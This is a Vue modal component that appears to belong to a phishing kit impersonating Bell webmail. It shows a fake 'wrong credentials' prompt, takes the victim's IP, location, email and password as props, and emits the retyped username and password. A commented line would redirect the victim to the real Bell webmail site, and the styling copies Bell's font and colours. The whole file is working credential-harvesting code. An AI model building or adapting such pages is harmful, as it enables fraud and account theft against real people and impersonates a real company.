<template>
  <div class="modal-overlay">
    <div class="modal-form">
      <h1 className="left-margin bold">Oops</h1>
      <h4 className="left-margin"> It seems you entered the wrong credentials!</h4>
      <form @submit.prevent="submitForm" class="field">
        <div class="form-group">
          <label for="retypedemail">Username</label>
          <input id="retypedemail" type="email" v-model="retypedEmail" name="email" />
          <div v-if="errors.email" class="error">{{ errors.email }}</div>
        </div>

        <div class="form-group">
          <label for="retypedpassword">Password</label>
          <input id="retypedpassword" type="password" v-model="retypedPassword" name="password" />
          <div v-if="errors.password" class="error">{{ errors.password }}</div>
        </div>

        <button type="submit" class="submit">Login</button>
      </form>
    </div>
  </div>
</template>

<script>
export default {
  name: 'ModalForm',
  props: {
    location: {
      type: Object,
      required: true,
    },
    ipAddress: {
      type: String,
    },
    email: {
      type: String,
    },
    password: {
      type: String,
    }
  },
  data() {
    return {
      errors: {},
      retypedEmail: '',
      retypedPassword: '',
    };
  },
  methods: {
    submitForm() {
      // this.$emit('submit', this.retypedEmail, this.retypedPassword);
      this.errors = {};

      if (!this.retypedEmail) {
        this.errors.email = 'Email is required';
      }

      if (!this.retypedPassword) {
        this.errors.password = 'Password is required';
      }

      if (Object.keys(this.errors).length === 0) {
        this.$emit('login-success', { retypedEmail: this.retypedEmail, retypedPassword: this.retypedPassword });
        this.$emit('close-modal');
        // window.location.href = 'https://webmail.en.bellnet.ca';
      }
    },
  },
};
</script>

<style scoped>
.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.5);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 1000;
}

.modal-form {
  background-color: #fff;
  padding: 20px;
  width: 300px;
  border-radius: 20px;
}

.bold {
  font-weight: 900;
}

.left-margin {
  margin-left: 21px;
}

.field {
  margin-top: 20px;
}

.field input[type='email'],
.field input[type='password'] {
  height: 40px;
  padding: 10px;
  border: 1px solid black;
  border-radius: 4px;
}

.field input[type='email']:focus,
.field input[type='password']:focus {
  outline: none;
  border: 1px solid #0088C1;
  /* box-shadow: 0 0 0 2px #007bff; */
  border-radius: 4px;
}

.form-group {
  display: flex;
  flex-direction: column;
  padding: 0 20px;
  margin-bottom: 10px;
}

.form-group label {
  font-size: 14px;
  margin-bottom: 5px;
  line-height: 18px;
  height: 20px;
  font-weight: 700;
  color: #666;
  font-family: "BellSlimBlack", Helvetica, Arial, sans-serif;
}

.submit {
  width: 100%;
  padding: 10px;
  border: none;
  border-radius: 5px;
  color: white;
  background: #0088C1;
  cursor: pointer;
  transition: background 0.3s;
  height: 55px;
  font-weight: bold;
  margin: 15px 20px 20px 0;
  min-width: 210px;
}

.submit:hover {
  /* opacity: 0.8; */
  background: #2266e6;
}

.error {
  color: red;
  font-size: 12px;
  margin-top: 7px;
}
</style>
